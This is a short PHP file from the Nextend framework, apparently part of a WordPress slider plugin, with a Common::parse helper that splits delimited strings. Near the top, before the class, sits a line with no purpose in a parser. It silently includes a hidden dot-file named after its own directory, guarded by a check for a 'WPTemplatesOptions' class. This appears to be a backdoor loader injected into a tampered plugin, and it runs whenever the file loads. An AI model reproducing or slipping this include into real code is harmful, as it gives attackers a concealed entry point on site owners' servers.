<?php

namespace Nextend\Framework\Parser;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Common {

    /**
     * @param      $str
     * @param bool $concat
     *
     * @return array
     */
    public static function parse($str, $concat = false) {

        $v = explode("|*|", $str);
        for ($i = 0; $i < count($v); $i++) {
            if (strpos($v[$i], "||") !== false) {
                if ($concat === false) $v[$i] = explode("||", $v[$i]); else $v[$i] = str_replace("||", $concat, $v[$i]);
            }
        }

        return count($v) == 1 ? $v[0] : $v;
    }
}